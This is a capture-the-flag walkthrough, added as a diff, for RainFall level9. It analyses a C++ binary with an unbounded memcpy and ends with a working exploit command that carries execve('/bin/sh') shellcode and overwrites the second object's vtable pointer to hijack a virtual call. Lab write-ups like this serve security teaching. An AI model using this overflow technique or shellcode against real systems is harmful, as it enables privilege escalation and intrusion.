@@ -1,0 +1,87 @@
+First, let's understand what we're dealing with: 
+
+This level appears to be different from the previous ones. Let's examine the behavior: 
+
+level9@RainFall:~$ ./level9
+level9@RainFall:~$ ./level9 test
+
+It takes a command-line argument but doesn't produce any visible output. 
+
+Using GDB, let's look at the main function: 
+See the assembly code in the ressources folder
+
+
+The main function looks unusual, with function names like: 
+
+     _Znwj@plt: This is C++ operator new
+     _ZN1NC2Ei: A constructor for a class called N
+     _ZN1N13setAnnotationEPc: A method called setAnnotation
+     
+
+This suggests we're dealing with a C++ binary, rather than pure C. 
+After analyzing the disassembly, we can determine: 
+
+     The program creates two instances of a class called N, with different constructor parameters
+     It calls the setAnnotation method on the first object, passing argv[1] as the parameter
+     It makes a virtual function call on the second object, passing the first object as a parameter
+     
+We can see that setAnnotation uses memcpy to copy the input string (without bounds checking) to this+4 in the object. 
+Based on our analysis, we've identified: 
+
+     A C++ object-oriented program with virtual functions
+     Two objects of the same class are created
+     An unbounded memcpy in the setAnnotation method
+     A virtual function call using the second object
+
+The vulnerability is a buffer overflow via the unchecked memcpy that allows us to: 
+
+     Overflow from the first object into the second
+     Overwrite the virtual function table pointer (vtable) of the second object
+     Control where the program jumps when calling the virtual function
+     
+Let's find where our input gets stored: 
+
+	(gdb) break *0x08048733
+	Breakpoint 1 at 0x8048733
+	(gdb) r AAAABBBBCCCCDDDD
+	Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDD
+
+	Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
+	(gdb) x/wx $esp
+	0xbffff5e0:	0x0804a00c
+
+
+Our buffer starts at address 0x0804a00c. This is object1+4 (4 bytes after the start of the first object). 
+
+The structure of a C++ object with virtual functions typically begins with a vtable pointer in the first 4 bytes, followed by the object's data. So: 
+
+     The first object starts at 0x0804a008
+     The second object, based on the allocation size of 108 bytes, starts at 0x0804a074
+
+Our exploitation strategy: 
+
+     Overwrite the vtable pointer of the second object to point to our controlled data
+     Place a fake function pointer and shellcode in our controlled buffer
+     When the virtual function is called, it will jump to our shellcode
+     
+
+Here is our exploit:
+	level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
+ 
+Breaking down the exploit: 
+
+     "\x10\xa0\x04\x08": Address 0x0804a010 (buffer_start+4) - our fake function pointer
+     "\x31\xc0\x50...": Shellcode for execve("/bin/sh")
+     "A" * 76: Padding to reach the vtable pointer of the second object
+     "\x0c\xa0\04\x08": Address 0x0804a00c (buffer_start) to overwrite the vtable pointer
+     
+When this exploit runs: 
+
+     setAnnotation copies our crafted string into the first object's buffer
+     The overflow overwrites the vtable pointer of the second object with 0x0804a00c
+
+When the main function makes a virtual call on the second object:
+	 It loads the vtable pointer (now 0x0804a00c)
+	 From that address, it loads the first function pointer (0x0804a010)
+	 It jumps to that address, which is right after our fake vtable pointer
+	 Our shellcode executes, spawning a shell with bonus0 privileges
